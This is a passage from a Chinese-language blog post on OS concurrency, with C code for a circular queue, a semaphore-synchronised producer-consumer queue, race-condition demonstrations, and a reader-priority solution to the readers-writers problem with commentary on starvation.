class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;queue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef struct&#123;</span></span><br><span class="line"><span class="comment">//     int *buf;</span></span><br><span class="line"><span class="comment">//     int n;</span></span><br><span class="line"><span class="comment">//     int front;</span></span><br><span class="line"><span class="comment">//     int rear;</span></span><br><span class="line"><span class="comment">// &#125;Queue;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">queue_init</span><span class="params">(Queue* this,<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    this-&gt;n=n+<span class="number">1</span>;<span class="comment">//实际上要多开一个槽,因为front==rear的时候表示缓冲区空</span></span><br><span class="line">    this-&gt;buf=(<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    this-&gt;front=this-&gt;rear=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">queue_destroy</span><span class="params">(Queue* this)</span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(this-&gt;buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">(Queue* this)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> this-&gt;front==this-&gt;rear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">full</span><span class="params">(Queue* this)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (this-&gt;rear+<span class="number">1</span>)%this-&gt;n==this-&gt;front;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(Queue* this,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    this-&gt;buf[(++this-&gt;rear)%(this-&gt;n)]=x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pop</span><span class="params">(Queue* this)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x=this-&gt;buf[(++this-&gt;front)%(this-&gt;n)];</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(Queue* this)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (this-&gt;rear+this-&gt;n-this-&gt;front)%this-&gt;n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef struct&#123;</span></span><br><span class="line"><span class="comment">//     Queue queue;</span></span><br><span class="line"><span class="comment">//     sem_t mutex;//临界区互斥锁</span></span><br><span class="line"><span class="comment">//     sem_t cnt_used;//已使用槽数</span></span><br><span class="line"><span class="comment">//     sem_t cnt_unused;//空槽数</span></span><br><span class="line"><span class="comment">// &#125;Safe_Queue;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">safe_init</span><span class="params">(Safe_Queue* this,<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    queue_init(&amp;this-&gt;<span class="built_in">queue</span>,n);</span><br><span class="line">    sem_init(&amp;this-&gt;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;this-&gt;cnt_unused,<span class="number">0</span>,n);</span><br><span class="line">    sem_init(&amp;this-&gt;cnt_used,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">safe_destory</span><span class="params">(Safe_Queue* this)</span>&#123;</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    queue_destroy(&amp;this-&gt;<span class="built_in">queue</span>);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">safe_empty</span><span class="params">(Safe_Queue* this)</span>&#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    status=empty(&amp;this-&gt;<span class="built_in">queue</span>);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">safe_full</span><span class="params">(Safe_Queue* this)</span>&#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    status=full(&amp;this-&gt;<span class="built_in">queue</span>);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">    <span class="keyword">return</span> status;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">safe_push</span><span class="params">(Safe_Queue* this,<span class="type">int</span> x)</span>&#123;<span class="comment">//生产者向队列中push元素</span></span><br><span class="line">    sem_wait(&amp;this-&gt;cnt_unused);</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    push(&amp;this-&gt;<span class="built_in">queue</span>,x);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">    sem_post(&amp;this-&gt;cnt_used);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">safe_pop</span><span class="params">(Safe_Queue* this)</span>&#123;<span class="comment">//消费者从队列中pop元素</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    sem_wait(&amp;this-&gt;cnt_used);</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    x=pop(&amp;this-&gt;<span class="built_in">queue</span>);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">    sem_post(&amp;this-&gt;cnt_unused);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">safe_length</span><span class="params">(Safe_Queue* this)</span>&#123;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    l=length(&amp;this-&gt;<span class="built_in">queue</span>);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="测试非同步队列">测试非同步队列</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;queue.h&quot;</span></span></span><br><span class="line">Queue <span class="built_in">queue</span>;</span><br><span class="line"><span class="type">int</span> cnt_push=<span class="number">0</span>;</span><br><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!full(&amp;<span class="built_in">queue</span>))&#123;</span><br><span class="line">        push(&amp;<span class="built_in">queue</span>,<span class="number">1</span>);</span><br><span class="line">        sem_wait(&amp;mutex);<span class="comment">//此句话需要保证互斥打印</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;in thread %ld,queue length=%d\n&quot;</span>,pthread_self(),length(&amp;<span class="built_in">queue</span>));</span><br><span class="line">        sem_post(&amp;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    sem_init(&amp;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    queue_init(&amp;<span class="built_in">queue</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="type">pthread_t</span> tid1,tid2;</span><br><span class="line">    pthread_create(&amp;tid1,<span class="literal">NULL</span>,func,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;tid2,<span class="literal">NULL</span>,func,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line">    queue_destroy(&amp;<span class="built_in">queue</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220531093702627.png"
alt="image-20220531093702627" />
<figcaption aria-hidden="true">image-20220531093702627</figcaption>
</figure>
<p>如果queue是线程同步的,一定不会出现两个相同的length</p>
<p>出现这种情况的原因是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(Queue* this,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    this-&gt;buf[(++this-&gt;rear)%(this-&gt;n)]=x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>length=90时</p>
<p>线程1取得<code>this-&gt;rear</code>并放到寄存器之后并没有立刻自增写回,而是在此时睡觉,</p>
<p>导致线程2也取得和线程1相同的<code>this-&gt;rear</code>放到寄存器,</p>
<p>线程2将寄存器中的<code>this-&gt;rear</code>快照自增后写回到临界区<code>buf</code>中,此时<code>length=91</code>,线程2打印91</p>
<p>线程1醒了,其睡觉前保存的线程上下文中<code>this-&gt;rear</code>是一开始的状态,线程1也将寄存器中的<code>this-&gt;rear</code>快照自增然后写回临界区buf,此时<code>length=91</code>,线程1打印91</p>
<p>这时两个线程对寄存器中<code>this-&gt;rear</code>的快照自增然后写回,实际上写到了<code>buf</code>的同一位置,并且导致<code>this-&gt;rear</code>只增加了1</p>
<h4 id="测试同步队列">测试同步队列</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;queue.h&quot;</span></span></span><br><span class="line">Safe_Queue safe_queue;</span><br><span class="line"><span class="type">int</span> cnt_push=<span class="number">0</span>;</span><br><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">safe_func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!safe_full(&amp;safe_queue))&#123;</span><br><span class="line">        safe_push(&amp;safe_queue,<span class="number">1</span>);</span><br><span class="line">        sem_wait(&amp;mutex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;in thread %ld,safe_queue length=%d\n&quot;</span>,pthread_self(),safe_length(&amp;safe_queue));</span><br><span class="line">        sem_post(&amp;mutex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    sem_init(&amp;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    safe_init(&amp;safe_queue,<span class="number">100</span>);</span><br><span class="line">    <span class="type">pthread_t</span> tid1,tid2;</span><br><span class="line">    pthread_create(&amp;tid1,<span class="literal">NULL</span>,safe_func,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;tid2,<span class="literal">NULL</span>,safe_func,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line">    safe_destory(&amp;safe_queue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用同步队列就不会有刚才的错误</p>
<h4 id="多个信号量">多个信号量?</h4>
<p>在<code>Safe_Queue</code>的<code>push</code>函数的实现中用到了多个信号量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">safe_push</span><span class="params">(Safe_Queue* this,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    sem_wait(&amp;this-&gt;cnt_unused);</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    push(&amp;this-&gt;<span class="built_in">queue</span>,x);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">    sem_post(&amp;this-&gt;cnt_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为什么不能直接写成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">safe_push</span><span class="params">(Safe_Queue* this,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    push(&amp;this-&gt;<span class="built_in">queue</span>,x);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样只考虑了临界区有没有线程在访问,没有考虑临界区还有没有空槽,如果临界区都写满了,即使没有线程在临界区中,也不应该继续写入</p>
<p>那为啥记录空槽数要用信号量?用一个普通的整数变量不可以吗?</p>
<p>即</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">safe_push</span><span class="params">(Safe_Queue* this,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!cnt_unused);</span><br><span class="line">    --cnt_unused;</span><br><span class="line">    sem_wait(&amp;this-&gt;mutex);</span><br><span class="line">    push(&amp;this-&gt;<span class="built_in">queue</span>,x);</span><br><span class="line">    sem_post(&amp;this-&gt;mutex);</span><br><span class="line">    ++cnt_used;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设<code>cnt_unused=1</code>,</p>
<p>此时<code>while(!cnt_unused);</code>完全有可能被两个线程同时判定失效,跳过循环,执行<code>--cnt_unused;</code>,导致<code>cnt_unused=0</code>或者<code>-1</code></p>
<p>显然空槽数量为一个非负数,这是不合法的</p>
<p>因此要限制某时刻最多只有一个线程访问<code>cnt_unused</code>,因此用信号量实现</p>
<h3 id="读者写者问题">读者写者问题</h3>
<p>同一个文件(或者说共享变量,临界区)被两种性质的线程访问:</p>
<p>只读线程:该种线程只是读取共享变量,不做修改</p>
<p>读写线程:该种线程会修改共享变量</p>
<p>显然共享变量允许被多个线程观摩但是只能允许同一时刻被一个线程修改.在被修改的时候不允许被其他任何读或者写的线程访问.</p>
<p>还要考虑一个读和写优先级的问题</p>
<p><strong>如果读优先</strong></p>
<p>如果当前有只读线程正在访问临界区,则后来的只读线程无需等待,直接进入临界区</p>
<p>如果当前有只读线程正在访问临界区,则后来的读写线程需要等待所有的只读线程读取完毕,临界区没有任何线程时才能进入临界区.即使在等待前面的只读线程时被后面的只读线程插队并被迫增加等待时间也没办法</p>
<p>如果当前有读写线程正在访问临界区,则当其读写完毕之后,首先允许只读线程进入临界区,如果没有只读线程才会允许读写线程进入临界区</p>
<p><strong>如果写优先</strong></p>
<p>如果当前有只读线程正在访问临界区,当其读完毕后首先允许读写线程进入临界区,如果没有读写线程在排队才会允许只读线程进入临界区</p>
<p>如果当前读写线程正在访问临界区,当其写完毕退出临界区后,立即允许下一个读写线程进入临界区,如果没有读写线程在排队,才会允许读线程进入临界区</p>
<h4 id="读优先">读优先</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> my_time=<span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">100</span>]=<span class="string">&quot;the buffer at first&quot;</span>;<span class="comment">//全局数组作为临界区</span></span><br><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"><span class="type">sem_t</span> w;</span><br><span class="line"><span class="type">int</span> cnt_reader=<span class="number">0</span>;<span class="comment">//记录临界区中的读者数量</span></span><br><span class="line"><span class="comment">//由于临界区中至多有一个写者,因此不需要记录写者数量</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_read</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_write</span><span class="params">(<span class="type">char</span> *s)</span>&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">reader</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    <span class="type">int</span> read_time=my_time;</span><br><span class="line">    <span class="keyword">while</span>(--read_time)&#123;</span><br><span class="line">        sem_wait(&amp;mutex);<span class="comment">//此处上锁的作用是,要修改cnt_reader的值和作家的锁</span></span><br><span class="line">        ++cnt_reader;</span><br><span class="line">        <span class="keyword">if</span>(cnt_reader==<span class="number">1</span>)&#123;<span class="comment">//第一位进入临界区的读者</span></span><br><span class="line">            sem_wait(&amp;w);<span class="comment">//给作家上锁,不让作家进来胡扯</span></span><br><span class="line">        &#125;</span><br><span class="line">        sem_post(&amp;mutex);<span class="comment">//mutex的作用更像是一个闸机,限制一人一杆</span></span><br><span class="line">        do_read();</span><br><span class="line">        <span class="comment">//走的时候也是闸机限流,一人一杆</span></span><br><span class="line">        sem_wait(&amp;mutex);</span><br><span class="line">        --cnt_reader;</span><br><span class="line">        <span class="keyword">if</span>(cnt_reader==<span class="number">0</span>)&#123;</span><br><span class="line">            sem_post(&amp;w);</span><br><span class="line">        &#125;</span><br><span class="line">        sem_post(&amp;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">writer</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    <span class="type">int</span> write_time=my_time;</span><br><span class="line">    <span class="keyword">while</span>(--write_time)&#123;</span><br><span class="line">        sem_wait(&amp;w);</span><br><span class="line">        <span class="type">char</span> temp[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">sprintf</span>(temp,<span class="string">&quot;buffer that modified by writer thread %ld&quot;</span>,pthread_self());</span><br><span class="line">        do_write(temp);</span><br><span class="line">        sem_post(&amp;w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    my_time=atoi(argv[<span class="number">1</span>]);<span class="comment">//使用命令行参数决定循环次数上限,防止程序一直运行</span></span><br><span class="line">    sem_init(&amp;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;w,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    cnt_reader=<span class="number">0</span>;</span><br><span class="line">    <span class="type">pthread_t</span> rtid[<span class="number">5</span>];</span><br><span class="line">    <span class="type">pthread_t</span> wtid[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;++i)&#123;</span><br><span class="line">        pthread_create(&amp;rtid[i],<span class="literal">NULL</span>,reader,<span class="literal">NULL</span>);</span><br><span class="line">        pthread_create(&amp;wtid[i],<span class="literal">NULL</span>,writer,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;++i)&#123;</span><br><span class="line">        pthread_join(rtid[i],<span class="literal">NULL</span>);</span><br><span class="line">        pthread_join(wtid[i],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main exit&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="作家">作家</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;w);</span><br><span class="line"><span class="type">char</span> temp[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(temp,<span class="string">&quot;buffer that modified by writer thread %ld&quot;</span>,pthread_self());</span><br><span class="line">do_write(temp);</span><br><span class="line">sem_post(&amp;w);</span><br></pre></td></tr></table></figure>
<p><code>w</code>是一个针对作家的互斥锁,不光读者用w来排挤作家,作家也用w排挤作家</p>
<p>当w为0的时候作家打死也不允许进入临界区.</p>
<p>读者和作家都有权力修改w的值,</p>
<p>作家修改w避免其他作家进入临界区这个好理解,就是防止同一个临界区有两个作家打架</p>
<p>当有一个读者进入临界区时就会修改w为0,此时只允许其他读者进入临界区,不允许作家进入</p>
<p>当最后一个读者退出临界区时才会放开w=1,允许卑微的作家进入临界区</p>
<h5 id="读者">读者</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;mutex);<span class="comment">//此处上锁的作用是,要修改cnt_reader的值和作家的锁</span></span><br><span class="line">++cnt_reader;</span><br><span class="line"><span class="keyword">if</span>(cnt_reader==<span class="number">1</span>)&#123;<span class="comment">//第一位进入临界区的读者</span></span><br><span class="line">    sem_wait(&amp;w);<span class="comment">//给作家上锁,不让作家进来胡扯</span></span><br><span class="line">&#125;</span><br><span class="line">sem_post(&amp;mutex);<span class="comment">//mutex的作用更像是一个闸机,限制一人一杆</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">do_read();<span class="comment">//读取临界区</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//走的时候也是闸机限流,一人一杆</span></span><br><span class="line">sem_wait(&amp;mutex);</span><br><span class="line">--cnt_reader;</span><br><span class="line"><span class="keyword">if</span>(cnt_reader==<span class="number">0</span>)&#123;</span><br><span class="line">    sem_post(&amp;w);</span><br><span class="line">&#125;</span><br><span class="line">sem_post(&amp;mutex);</span><br></pre></td></tr></table></figure>
<p>读者有两次关于<code>mutex</code>的上锁和开锁,其作用可以举一个例子进行类比</p>
<blockquote>
<p>坐地铁时我们要刷卡或者刷二维码过闸机,每次只允许一个人刷卡过闸机,一人一杆,过了闸机就意味着有权力做地铁了,<code>++cnt_reader</code>就相当于把自己放到了地铁上</p>
<p>这里的mutex就起到了闸机的作用,限制读线程一个一个修改<code>cnt_reader</code>,防止两个线程同时修改<code>cnt_reader</code>但是最终<code>cnt_reader</code>只增加了1这种情况.</p>
<blockquote>
<p>更直观的,如果不用mutex锁</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">++cnt_reader;</span><br><span class="line"><span class="keyword">if</span>(cnt_reader==<span class="number">1</span>)&#123;<span class="comment">//第一位进入临界区的读者</span></span><br><span class="line">    sem_wait(&amp;w);<span class="comment">//给作家上锁,不让作家进来胡扯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_read();<span class="comment">//读取临界区</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//走的时候也是闸机限流,一人一杆</span></span><br><span class="line">--cnt_reader;</span><br><span class="line"><span class="keyword">if</span>(cnt_reader==<span class="number">0</span>)&#123;</span><br><span class="line">    sem_post(&amp;w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>线程1将<code>cnt_reader</code>放到寄存器中还没来得及将自增写回到<code>cnt_reader</code>就睡了一觉,线程2读取到的是线程1写回之前的<code>cnt_reader</code>,两个线程读取到了相同的<code>cnt_reader</code>,自增后写回的也是相同的<code>cnt_reader</code>,导致两个线程同时挤进临界区但是读者计数器只增加了1</p>
</blockquote>
</blockquote>
<p>这种情况下写者可能用数量灌死读者,让读者永远没有读的机会</p>
<p>试想如果只有一个读者线程,成百上千个写者线程,假设读者线程首先进入临界区,此时读者持有w锁,这使得所有写者无能狂怒,均卡在<code>sem_wait(&amp;w);</code>这个位置</p>
<p>然后读者终于出了临界区,释放了w锁,此时在等待w锁的写者1已经成百上千,其中有一个幸运儿被选中获得了w锁进入临界区,这又使得剩下的写者和这一个读者无能狂怒,都卡在<code>sem_wait(&amp;w);</code>这个位置</p>
